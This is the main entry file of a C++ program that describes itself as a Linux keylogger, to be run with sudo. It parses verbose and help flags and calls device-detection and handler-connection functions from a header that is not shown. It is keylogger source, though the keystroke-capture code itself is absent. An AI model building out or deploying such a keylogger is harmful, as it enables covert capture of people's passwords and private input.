#include <iostream> 
#include "logger.h"
using namespace std;

int main(int argc, char **argv) {
	bool verbose = false;
	string devices = "";
	string handler = "";

	for (int i = 0; i < argc; i++) {
		if(strcmp(argv[i], "-v") == 0) {
			verbose = true;
		}
		if((strcmp(argv[i], "-h") == 0) or (strcmp(argv[i], "--help") == 0)) {
			cout << "A linux API keylogger." << endl;
			cout << "To run: sudo ./keylogger [-v|-h|--help]" << endl;
			cout << "Note: Be sure to run program with sudo." << endl << endl;
			cout << "\tflags:" << endl;
			cout << "\t-v\tRun program in verbose mode. Print out more info." << endl;
			cout << "\t-h\tPrint help info on program." << endl;
			cout << "\t--help\tPrint help info on program." << endl;
			exit(0);
		}
	}

	if (verbose) cout << "For best result run program using sudo." << endl;
	if (verbose) cout << "Starting program..." << endl;
	devices = logger::getDevices(verbose);
	handler = logger::getHandler(devices, verbose);
	logger::connectHandler(handler, verbose);
	if (verbose) std::cout << "program done." << std::endl;
	return 0;
}